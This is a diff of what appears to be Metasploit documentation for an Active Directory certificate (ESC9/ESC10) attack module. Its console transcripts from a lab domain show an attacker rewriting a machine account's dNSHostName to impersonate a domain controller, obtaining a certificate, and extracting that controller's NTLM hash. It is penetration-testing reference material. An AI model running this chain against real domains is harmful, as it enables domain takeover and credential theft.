@@ -1120,71 +1120,54 @@ So `NEW_VALUE` as well as `ALT_DNS` will be set to `DC2.kerberos.issue`.
 
 
 ```
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set rhosts 172.16.199.200
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set rhosts 172.16.199.200
 rhosts => 172.16.199.200
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set ldaprport 389
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set ldaprport 389
 ldaprport => 389
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set target_username "Test2$"
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set target_username "Test2$"
 target_username => Test2$
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set new_value dc2.kerberos.issue
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set new_value dc2.kerberos.issue
 new_value => dc2.kerberos.issue
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set alt_dns dc2.kerberos.issue
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set alt_dns dc2.kerberos.issue
 alt_dns => dc2.kerberos.issue
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set UPDATE_LDAP_OBJECT dnsHostName
-UPDATE_ESC9_ESC10_OBJECT => dNSHostName
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set CA kerberos-DC2-CA
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set UPDATE_LDAP_OBJECT dnsHostName
+UPDATE_LDAP_OBJECT => dNSHostName
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set CA kerberos-DC2-CA
 CA => kerberos-DC2-CA
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE ESC9-Template-Dns
-CERT_TEMPLATE => ESC9-Template-Dns
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set smbdomain kerberos.issue
-smbdomain => kerberos.issue
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set smbpass N0tpassword!
-smbpass => N0tpassword!
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set smbuser Test1$
-smbuser => Test1$
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set verbose true
-verbose => true
-msf6 auxiliary(admin/dcerpc/icpr_cert) > run
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > run
 [*] Running module against 172.16.199.200
-[*] 172.16.199.200:445 - Connecting to ICertPassage (ICPR) Remote Protocol
-[*] 172.16.199.200:445 - Binding to \cert...
-[+] 172.16.199.200:445 - Bound to \cert
-[+] 172.16.199.200:445 - Successfully bound to the LDAP server!
-[*] 172.16.199.200:445 - Using base DN: DC=kerberos,DC=issue
-[*] 172.16.199.200:445 - Filter: (&(objectClass=computer)(sAMAccountName=test2$))
-[*] 172.16.199.200:445 - Attributes: ["dnshostname"]
-[+] 172.16.199.200:445 - The original value of dnshostname was not set for test2$. This is to be expected for the dNSHostName of machine accounts or the UPN of the builtin Administrator
-[*] 172.16.199.200:445 - Updating dNSHostName of test2$ to dc2.kerberos.issue
+[+] 172.16.199.200:445 - Retrieved original value for dnshostname: dc2.kerberos.issue
+[*] 172.16.199.200:445 - Updating dNSHostName of Test2$ to dc2.kerberos.issue
 [*] 172.16.199.200:445 - Loading auxiliary/gather/ldap_update_object
 [*] 172.16.199.200:445 - Running auxiliary/gather/ldap_update_object
 [*] Connecting to LDAP on 172.16.199.200:389...
-[*] Searching for target object: test2$...
+[*] Searching for target object: Test2$...
 [+] Found target object DN: CN=Test2,CN=Computers,DC=kerberos,DC=issue
 [*] Attempting to update dNSHostName for CN=Test2,CN=Computers,DC=kerberos,DC=issue to dc2.kerberos.issue...
 [+] Successfully updated CN=Test2,CN=Computers,DC=kerberos,DC=issue's dNSHostName to dc2.kerberos.issue
-[*] 172.16.199.200:445 - Requesting a certificate for user test2$ - digest algorithm: SHA256 - template: ESC9-Template-Dns
 [+] 172.16.199.200:445 - The requested certificate was issued.
 [*] 172.16.199.200:445 - Certificate Policies:
 [*] 172.16.199.200:445 -   * 1.3.6.1.5.5.7.3.2 (Client Authentication)
 [*] 172.16.199.200:445 -   * 2.5.29.37.0
-[*] 172.16.199.200:445 - Certificate stored at: /Users/jheysel/.msf4/loot/20250515152955_default_172.16.199.200_windows.ad.cs_466766.pfx
-[*] 172.16.199.200:445 - Reverting dNSHostName of test2$ back to <null>
+[*] 172.16.199.200:445 - Certificate DNS: dc2.kerberos.issue
+[*] 172.16.199.200:445 - Certificate stored at: /Users/jheysel/.msf4/loot/20250526151527_default_172.16.199.200_windows.ad.cs_740814.pfx
+[*] 172.16.199.200:445 - Reverting dNSHostName of Test2$ back to dc2.kerberos.issue
 [*] 172.16.199.200:445 - Loading auxiliary/gather/ldap_update_object
 [*] 172.16.199.200:445 - Running auxiliary/gather/ldap_update_object
 [*] Connecting to LDAP on 172.16.199.200:389...
-[*] Searching for target object: test2$...
+[*] Searching for target object: Test2$...
 [+] Found target object DN: CN=Test2,CN=Computers,DC=kerberos,DC=issue
-[*] Attempting to update dNSHostName for CN=Test2,CN=Computers,DC=kerberos,DC=issue to <null>...
-[+] Successfully updated CN=Test2,CN=Computers,DC=kerberos,DC=issue's dNSHostName to <null>
+[*] Attempting to update dNSHostName for CN=Test2,CN=Computers,DC=kerberos,DC=issue to dc2.kerberos.issue...
+[+] Successfully updated CN=Test2,CN=Computers,DC=kerberos,DC=issue's dNSHostName to dc2.kerberos.issue
 [*] Auxiliary module execution completed
 
-msf6 auxiliary(admin/kerberos/get_ticket) > get_hash rhosts=172.16.199.200 cert_file=/Users/jheysel/.msf4/loot/20250515130904_default_172.16.199.200_windows.ad.cs_888816.pfx
+msf6 auxiliary(admin/kerberos/get_ticket) > get_hash rhosts=172.16.199.200 cert_file=/Users/jheysel/.msf4/loot/20250526151527_default_172.16.199.200_windows.ad.cs_740814.pfx
 [*] Running module against 172.16.199.200
 [+] 172.16.199.200:88 - Received a valid TGT-Response
-[*] 172.16.199.200:88 - TGT MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20250515131250_default_172.16.199.200_mit.kerberos.cca_282125.bin
+[*] 172.16.199.200:88 - TGT MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20250526152242_default_172.16.199.200_mit.kerberos.cca_510413.bin
 [*] 172.16.199.200:88 - Getting NTLM hash for dc2$@kerberos.issue
 [+] 172.16.199.200:88 - Received a valid TGS-Response
-[*] 172.16.199.200:88 - TGS MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20250515131250_default_172.16.199.200_mit.kerberos.cca_760862.bin
+[*] 172.16.199.200:88 - TGS MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20250526152242_default_172.16.199.200_mit.kerberos.cca_688146.bin
 [+] Found NTLM hash for dc2$: aad3b435b51404eeaad3b435b51404ee:e94f9c213b133b15a194099bc361cc58
 [*] Auxiliary module execution completed
 ```
@@ -1234,8 +1217,6 @@ msf6 auxiliary(admin/dcerpc/icpr_cert) > run
 [*] Attempting to update userPrincipalName for CN=user2,CN=Users,DC=kerberos,DC=issue to user2...
 [+] Successfully updated CN=user2,CN=Users,DC=kerberos,DC=issue's userPrincipalName to user2
 [*] Auxiliary module execution completed
-
-
 ```
 
 
